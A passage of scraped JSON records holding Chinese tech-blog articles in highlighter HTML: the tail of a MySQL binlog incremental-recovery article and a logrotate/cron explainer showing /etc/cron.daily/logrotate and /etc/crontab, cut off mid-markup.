class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">21</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line\" id=\"crayon-594b05eaae922204537540-9\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">xiaoda</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">31</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05eaae922204537540-10\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fuaiai</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">26</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line\" id=\"crayon-594b05eaae922204537540-11\"><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05eaae922204537540-12\"><span class=\"crayon-cn\">6</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">rows </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">set</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">0.00</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">sec</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0034 seconds] -->\r\n<p>以上就是mysql数据库增量数据恢复的实例过程！</p>\n<h3>最后，总结几点：</h3>\n<p>1）本案例适用于人为SQL语句造成的误操作或者没有主从复制等的热备情况宕机时的修复</p>\n<p>2）恢复条件为mysql要开启binlog日志功能，并且要全备和增量的所有数据</p>\n<p>3）恢复时建议对外停止更新，即禁止更新数据库</p>\n<p>4）先恢复全量，然后把全备时刻点以后的增量日志，按顺序恢复成SQL文件，然后把文件中有问题的SQL语句删除（也可通过时间和位置点），再恢复到数据库。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111402\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111402votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111402\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 3 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2016/04/6813e861d7765d2cf8c1f7f313083944.jpg"], "fav_nums": 3, "comment_nums": 0, "create_date": "2017/06/08", "praise_nums": 1}
{"tags": "日志,IT技术,Linux", "front_image_path": "full/d3d1a5ad957de059084690efae6fdfaa3527e1c3.jpg", "title": "Linux 日志定时轮询流程详解", "url_object_id": "5ff5ef91db0f7e945672fd3845b1e947", "url": "http://blog.jobbole.com/111405/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"http://www.jianshu.com/p/ea7c2363639c\">cooffeelis</a>   </div><h3>logrotate介绍</h3>\n<p>对于Linux系统安全来说，日志文件是极其重要的工具。日志文件包含了关于系统中发生的事件的有用信息，在排障过程中或者系统性能分析时经常被用到。当日志文件不断增长的时候，就需要定时切割，否则，写日志的速度和性能也会下降，更不便于我们归档，查询。</p>\n<p>所以便有了使用logrotate的时候 ，logrotate是个十分有用的工具，它可以自动对日志进行截断（或轮循）、压缩以及删除旧的日志文件。例如，你可以设置logrotate，让/var/log/foo日志文件每30天轮循，并删除超过6个月的日志。配置完后，logrotate的运作完全自动化，不必进行任何进一步的人为干预。</p>\n<h3>logrotate配置文件位置</h3>\n<p>Linux系统默认安装logrotate工具，它默认的配置文件在：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd526b1c60265826239\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n/etc/logrotate.conf\r\n/etc/logrotate.d/</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd526b1c60265826239-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd526b1c60265826239-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd526b1c60265826239-1\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">logrotate</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">conf</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd526b1c60265826239-2\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">logrotate</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">d</span><span class=\"crayon-o\">/</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0012 seconds] -->\r\n<p>logrotate.conf 才主要的配置文件，logrotate.d 是一个目录，该目录里的所有文件都会被主动的读入/etc/logrotate.conf中执行。<br>\n另外，如果 /etc/logrotate.d/ 里面的文件中没有设定一些细节，则会以/etc/logrotate.conf这个文件的设定来作为默认值。</p>\n<p>实际运行时，Logrotate会调用配置文件/etc/logrotate.conf。</p>\n<p>可以在/etc/logrotate.d目录里放置自定义好的配置文件，用来覆盖Logrotate的缺省值。</p>\n<h3>定时轮循机制</h3>\n<p><strong>Logrotate是基于CRON来运行的，其脚本是/etc/cron.daily/logrotate，日志轮转是系统自动完成的。</strong></p>\n<p>logrotate这个任务默认放在cron的每日定时任务cron.daily下面 /etc/cron.daily/logrotate/etc/目录下面还有cron.weekly/, cron.hourly/, cron.monthly/ 的目录都是可以放定时任务的</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd526b1c6c655688770\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n[/etc]$ cat /etc/cron.daily/logrotate\r\n#!/bin/sh\r\n\r\n# Clean non existent log file entries from status file\r\ncd /var/lib/logrotate\r\ntest -e status || touch status\r\nhead -1 status &gt; status.clean\r\nsed 's/\"//g' status | while read logfile date\r\ndo\r\n    [ -e \"$logfile\" ] &amp;&amp; echo \"\\\"$logfile\\\" $date\"\r\ndone &gt;&gt; status.clean\r\nmv status.clean status\r\n\r\ntest -x /usr/sbin/logrotate || exit 0\r\n/usr/sbin/logrotate /etc/logrotate.conf</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd526b1c6c655688770-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd526b1c6c655688770-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd526b1c6c655688770-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd526b1c6c655688770-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bd526b1c6c655688770-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd526b1c6c655688770-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594bd526b1c6c655688770-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd526b1c6c655688770-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-594bd526b1c6c655688770-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd526b1c6c655688770-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-594bd526b1c6c655688770-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd526b1c6c655688770-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-594bd526b1c6c655688770-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd526b1c6c655688770-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-594bd526b1c6c655688770-15\">15</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd526b1c6c655688770-1\"><span class=\"crayon-sy\">[</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">cat</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">cron</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">daily</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">logrotate</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd526b1c6c655688770-2\"><span class=\"crayon-p\">#!/bin/sh</span></div><div class=\"crayon-line\" id=\"crayon-594bd526b1c6c655688770-3\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd526b1c6c655688770-4\"><span class=\"crayon-p\"># Clean non existent log file entries from status file</span></div><div class=\"crayon-line\" id=\"crayon-594bd526b1c6c655688770-5\"><span class=\"crayon-v\">cd</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">lib</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">logrotate</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd526b1c6c655688770-6\"><span class=\"crayon-v\">test</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">e</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">status</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">||</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">touch </span><span class=\"crayon-e\">status</span></div><div class=\"crayon-line\" id=\"crayon-594bd526b1c6c655688770-7\"><span class=\"crayon-v\">head</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">status</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">status</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">clean</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd526b1c6c655688770-8\"><span class=\"crayon-i\">sed</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'s/\"//g'</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">status</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">while</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">read </span><span class=\"crayon-e\">logfile </span><span class=\"crayon-e\">date</span></div><div class=\"crayon-line\" id=\"crayon-594bd526b1c6c655688770-9\"><span class=\"crayon-st\">do</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd526b1c6c655688770-10\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">[</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">e</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"$logfile\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"\\\"$logfile\\\" $date\"</span></div><div class=\"crayon-line\" id=\"crayon-594bd526b1c6c655688770-11\"><span class=\"crayon-v\">done</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">status</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">clean</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd526b1c6c655688770-12\"><span class=\"crayon-e\">mv </span><span class=\"crayon-v\">status</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">clean </span><span class=\"crayon-e\">status</span></div><div class=\"crayon-line\" id=\"crayon-594bd526b1c6c655688770-13\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd526b1c6c655688770-14\"><span class=\"crayon-v\">test</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">x</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">logrotate</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">||</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">exit</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span></div><div class=\"crayon-line\" id=\"crayon-594bd526b1c6c655688770-15\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">logrotate</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">logrotate</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">conf</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0028 seconds] -->\r\n<p>这里实际操作轮询的命令最后一行<br>\n<code>/usr/sbin/logrotate /etc/logrotate.conf</code></p>\n<p>定义好了每日执行任务的脚本cron.daily/logrotate ，再查看crontab的内容，里面设置好了对应的cron.xxly</p>\n<p>执行时间</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd526b1c71273435449\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n[/etc]$ vim /etc/crontab\r\nSHELL=/bin/sh\r\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\r\n\r\n# m h dom mon dow user    command\r\n17 *    * * *    root    cd / &amp;&amp; run-parts --report /etc/cron.hourly\r\n25 6    * * *    root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )\r\n47 6    * * 7    root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )\r\n52 6    1 * *    root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd526b1c71273435449-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd526b1c71273435449-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd526b1c71273435449-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd526b1c71273435449-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bd526b1c71273435449-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd526b1c71273435449-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594bd526b1c71273435449-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd526b1c71273435449-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-594bd526b1c71273435449-9\">9</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd526b1c71273435449-1\"><span class=\"crayon-sy\">[</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">vim</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">crontab</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd526b1c71273435449-2\"><span class=\"crayon-v\">SHELL</span><span class=\"crayon-o\">=</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">sh</span></div><div class=\"crayon-line\" id=\"crayon-594bd526b1c71273435449-3\"><span class=\"crayon-v\">PATH</span><span class=\"crayon-o\">=</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">local</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">local</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd526b1c71273435449-4\"> </div><div class=\"crayon-line\" id=\"crayon-594bd526b1c71273435449-5\"><span class=\"crayon-p\"># m h dom mon dow user    command</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd526b1c71273435449-6\"><span class=\"crayon-cn\">17</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\">    </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\">    </span><span class=\"crayon-e\">root    </span><span class=\"crayon-v\">cd</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">run</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">parts</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">report</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">cron</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">hourly</span></div><div class=\"crayon-line\" id=\"crayon-594bd526b1c71273435449-7\"><span class=\"crayon-cn\">25</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6</span><span class=\"crayon-h\">    </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\">    </span><span class=\"crayon-e\">root    </span><span class=\"crayon-v\">test</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">x</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">anacron</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">||</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">cd</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">run</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">parts</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">report</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">cron</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">daily</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd526b1c71273435449-8\"><span class=\"crayon-cn\">47</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6</span><span class=\"crayon-h\">    </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">7</span><span class=\"crayon-h\">    </span><span class=\"crayon-e\">root    </span><span class=\"crayon-v\">test</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">x</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">anacron</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">||</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">cd</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">run</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">parts</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">report</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span 